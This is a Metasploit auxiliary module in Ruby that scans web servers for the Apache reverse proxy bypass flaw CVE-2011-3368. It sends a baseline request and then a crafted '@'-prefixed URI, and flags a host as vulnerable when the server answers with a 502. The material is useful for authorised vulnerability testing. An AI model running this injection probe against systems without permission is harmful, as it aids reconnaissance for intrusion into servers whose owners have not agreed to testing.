##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Apache Reverse Proxy Bypass Vulnerability Scanner',
			'Description' => %q{
				Scan for poorly configured reverse proxy servers.
				By default, this module attempts to force the server to make
				a request with an invalid domain name. Then, if the bypass
				is successful, the server will look it up and of course fail,
				then responding with a status code 502. A baseline status code
				is always established and if that baseline matches your test
				status code, the injection attempt does not occur.
				"set VERBOSE true" if you are paranoid and want to catch potential
				false negatives. Works best against Apache and mod_rewrite
			},
			'Author'      => ['chao-mu'],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					['URL', 'http://www.contextis.com/research/blog/reverseproxybypass/'],
					['CVE', '2011-3368'],
				]
		)

		register_options(
			[
				OptString.new('ESCAPE_SEQUENCE',
					[true, 'Character(s) that terminate the rewrite rule', '@']),

				OptString.new('INJECTED_URI',
					[true, 'String injected after escape sequence', '...']),

				OptInt.new('EXPECTED_RESPONSE',
					[true, 'Status code that indicates vulnerability', 502]),

				OptString.new('BASELINE_URI',
					[true, 'Requested to establish that EXPECTED_RESPONSE is not the usual response', '/']),
			], self.class)
	end

	def make_request(host, uri, timeout=20)
		begin
			requested_at = Time.now.utc
			response     = send_request_raw({'uri' => uri}, timeout)
			responded_at = Time.now.utc
		rescue ::Rex::ConnectionError => e
			vprint_error e.to_s
			return nil
		end

		if response.nil?
			vprint_error "#{rhost}:#{rport} Request timed out"
			return nil
		end

		seconds_transpired = (responded_at - requested_at).to_f
		vprint_status "#{rhost}:#{rport} Server took #{seconds_transpired} seconds to respond to URI #{uri}"

		status_code = response.code
		vprint_status "#{rhost}:#{rport} Server responded with status code #{status_code} to URI #{uri}"

		return {
			:requested_at => requested_at,
			:responded_at => responded_at,
			:status_code  => status_code
		}
	end

	def run_host(host)
		test_status_code = datastore['EXPECTED_RESPONSE']

		baseline = make_request(host, datastore['BASELINE_URI'])
		if baseline.nil?
			return
		end

		if baseline[:status_code] == test_status_code
			vprint_error "#{rhost}:#{rport} The baseline status code for #{host} matches our test's"
			return
		end

		uri = datastore['ESCAPE_SEQUENCE'] + datastore['INJECTED_URI']
		injection_info = make_request(host, uri, 60)

		status_code = injection_info[:status_code]
		if status_code == test_status_code
			print_good "#{rhost}:#{rport} Server appears to be vulnerable!"
			report_vuln(
				:host   => host,
				:port   => rport,
				:proto  => 'tcp',
				:sname  => ssl ? 'https' : 'http',
				:name   => self.name,
				:info   => "Module #{self.fullname} obtained #{status_code} when requesting #{uri}",
				:refs   => self.references,
				:exploited_at => injection_info[:requested_at]
			)
		end
	end
end
